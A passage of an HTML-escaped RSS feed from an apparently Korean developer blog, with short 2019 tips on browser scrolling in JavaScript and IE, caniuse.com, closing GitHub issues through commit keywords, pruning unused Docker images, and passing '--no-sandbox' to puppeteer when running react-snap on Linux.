&lt;p&gt;그 후, 사용할 &lt;code class=&quot;language-text&quot;&gt;window.scroll&lt;/code&gt;을 다음과 같이 수정해준다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;scroll&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;behavior&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;smooth&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[브라우저 CSS 기능 호완성 테스트]]></title><description><![CDATA[CSS를 적용할 때, 브라우저별로 적용해야 하는 방법이 다른 경우가 있다. 이 때, 해당 기능이 브라우저에서 지원을 하는지 확인하기 위해서 caniuse.com에서 검색하면된다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Tue, 05 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;CSS를 적용할 때, 브라우저별로 적용해야 하는 방법이 다른 경우가 있다.&lt;/p&gt;
&lt;p&gt;이 때, 해당 기능이 브라우저에서 지원을 하는지 확인하기 위해서 &lt;a href=&quot;https://caniuse.com&quot;&gt;caniuse.com&lt;/a&gt;에서 검색하면된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Github 커밋 메시지로 이슈 닫기]]></title><description><![CDATA[깃허브를 사용할 때, 커밋을 통하여 이슈를 닫을 수 있다. 아래의 키워드를 포함하여 커밋 메시지를 작성하면 자동으로 이슈가 닫아진다. close closes closed fix fixes fixed resolve resolves resolved…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 04 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;깃허브를 사용할 때, 커밋을 통하여 이슈를 닫을 수 있다.&lt;/p&gt;
&lt;p&gt;아래의 키워드를 포함하여 커밋 메시지를 작성하면 자동으로 이슈가 닫아진다.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;close&lt;/li&gt;
&lt;li&gt;closes&lt;/li&gt;
&lt;li&gt;closed&lt;/li&gt;
&lt;li&gt;fix&lt;/li&gt;
&lt;li&gt;fixes&lt;/li&gt;
&lt;li&gt;fixed&lt;/li&gt;
&lt;li&gt;resolve&lt;/li&gt;
&lt;li&gt;resolves&lt;/li&gt;
&lt;li&gt;resolved&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;다음과 같은 사용할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Fix bug close #2&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 작성하면 2번 이슈를 닫게된다. 이 때, 주의해야 할 점으로 키워드가 바로 앞에 나와야만 적용이 된다.&lt;/p&gt;
&lt;p&gt;만약 다음과 같이 작성하면 이슈가 닫히지 않는다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Fix bug #2&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;참고: &lt;a href=&quot;https://help.github.com/en/articles/closing-issues-using-keywords&quot;&gt;깃허브 공식 문서&lt;/a&gt;{:target=”_blank”}&lt;/p&gt;</content:encoded></item><item><title><![CDATA[IE Window scroll]]></title><description><![CDATA[javascript를 사용하여 웹 개발을 할 때, 브라우저 스크롤이 필요할 때가 있다. 일반적으로 를 사용하면 되지만, 우리의 IE는 이를 모르기 때문에 추가적으로 를 사용해야 한다. 그렇기에 다음과 같이 사용할 수 있다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 03 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;javascript를 사용하여 웹 개발을 할 때, 브라우저 스크롤이 필요할 때가 있다.&lt;/p&gt;
&lt;p&gt;일반적으로 &lt;code class=&quot;language-text&quot;&gt;window.scrollY&lt;/code&gt;를 사용하면 되지만, 우리의 IE는 이를 모르기 때문에 추가적으로 &lt;code class=&quot;language-text&quot;&gt;document.documentElement.scrollTop&lt;/code&gt;를 사용해야 한다.&lt;/p&gt;
&lt;p&gt;그렇기에 다음과 같이 사용할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; scroll &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;scrollY &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;documentElement&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;scrollTop&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Docker 사용하지 않는 이미지 제거]]></title><description><![CDATA[Docker를 사용하다 보면 이미지가 계속 쌓이게 된다. 특히 예전에 사용하던 이미지들이 쌓이면서 용량이 부족해지는 경우가 생기는데, 아래 명령을 통해 지울 수 있다. https://docs.docker.com/engine/reference…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 02 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Docker를 사용하다 보면 이미지가 계속 쌓이게 된다.&lt;/p&gt;
&lt;p&gt;특히 예전에 사용하던 이미지들이 쌓이면서 용량이 부족해지는 경우가 생기는데, 아래 명령을 통해 지울 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;docker&lt;/span&gt; image prune -a&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.docker.com/engine/reference/commandline/image_prune/&quot;&gt;https://docs.docker.com/engine/reference/commandline/image_prune/&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[React snap puppeteer no-sandbox]]></title><description><![CDATA[React snap을 사용할 때, 리눅스에서 puppeteer에서 에러가 발생하는 경우가 있습니다. no-sandbox…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 01 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;React snap을 사용할 때, 리눅스에서 puppeteer에서 에러가 발생하는 경우가 있습니다. no-sandbox를 옵션으로 주어야 하기 때문에 발생하는데, 이를 &lt;code class=&quot;language-text&quot;&gt;pacakge.json&lt;/code&gt;에 옵션으로 주게되면 해결하였습니다.&lt;/p&gt;
&lt;p&gt;먼저, &lt;code class=&quot;language-text&quot;&gt;react-snap&lt;/code&gt;을 실행하면 수행하는 스크립트를 알아보겠습니다. &lt;strong&gt;./node_modules/react-snap/package.json&lt;/strong&gt;을 보면 다음과 같이 스크립트가 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token property&quot;&gt;&quot;bin&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;react-snap&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./run.js&quot;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이제 이 파일을 보게되면,&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token hashbang comment&quot;&gt;#!/usr/bin/env node&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;url&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; run &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;./index.js&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; reactSnap&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; homepage&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; devDependencies&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; dependencies &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;process&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;cwd&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;/package.json&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; publicUrl &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; process&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;env&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;PUBLIC_URL&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; homepage&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; reactScriptsVersion &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;devDependencies &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; devDependencies&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;react-scripts&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dependencies &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; dependencies&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;react-scripts&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; fixWebpackChunksIssue&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;reactScriptsVersion&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    fixWebpackChunksIssue &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;CRA1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    fixWebpackChunksIssue &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;CRA2&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token function&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;publicPath&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; publicUrl &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; url&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;publicUrl&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pathname &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  fixWebpackChunksIssue&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;reactSnap&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;error&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  process&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;와 같이 작성되어있습니다. &lt;code class=&quot;language-text&quot;&gt;package.json&lt;/code&gt;에서 &lt;strong&gt;reactSnap&lt;/strong&gt;설정을 불러오고, 이를 run함수의 인자로 넘겨주게 됩니다. &lt;code class=&quot;language-text&quot;&gt;index.js&lt;/code&gt;를 보면 다음과 같은 부분이 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; crawl &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;./src/puppeteer_utils.js&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;crawl&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;run&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;userOptions&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; fs &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; nativeFs &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; options&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    options &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;defaults&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;userOptions&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; Promise&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;reject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;crawl&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    options&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;마지막으로 &lt;strong&gt;crawl&lt;/strong&gt;함수를 보겠습니다. 이 파일은 &lt;code class=&quot;language-text&quot;&gt;./src/puppeteer_utils.js&lt;/code&gt;에 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;crawl&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;token parameter&quot;&gt;opt&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    options&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    basePath&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    beforeFetch&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    afterFetch&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    onEnd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    publicPath&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    sourceDir
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; opt&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; browser &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;await&lt;/span&gt; puppeteer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;launch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;headless&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; options&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;headless&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; options&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;puppeteerArgs&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;executablePath&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; options&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;puppeteerExecutablePath&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;ignoreHTTPSErrors&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; options&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;puppeteerIgnoreHTTPSErrors&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;handleSIGINT&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위와 같이 작성이 되어있는데, 에러 메세지에서 참고하라고 나온 &lt;a href=&quot;https://github.com/GoogleChrome/puppeteer/blob/master/docs/troubleshooting.md&quot;&gt;공식 문서&lt;/a&gt;를 살펴보면 다음과 같은 부분이 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; browser &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;await&lt;/span&gt; puppeteer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;launch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;--no-sandbox&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;--disable-setuid-sandbox&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 부분처럼, &lt;strong&gt;args&lt;/strong&gt;에 &lt;code class=&quot;language-text&quot;&gt;--no-sandbox&lt;/code&gt;옵션을 주면 해결할 수 있습니다. 최종적으로 &lt;code class=&quot;language-text&quot;&gt;package.json&lt;/code&gt;에 다음과 같이 추가해주면 됩니다.&lt;/p&gt;
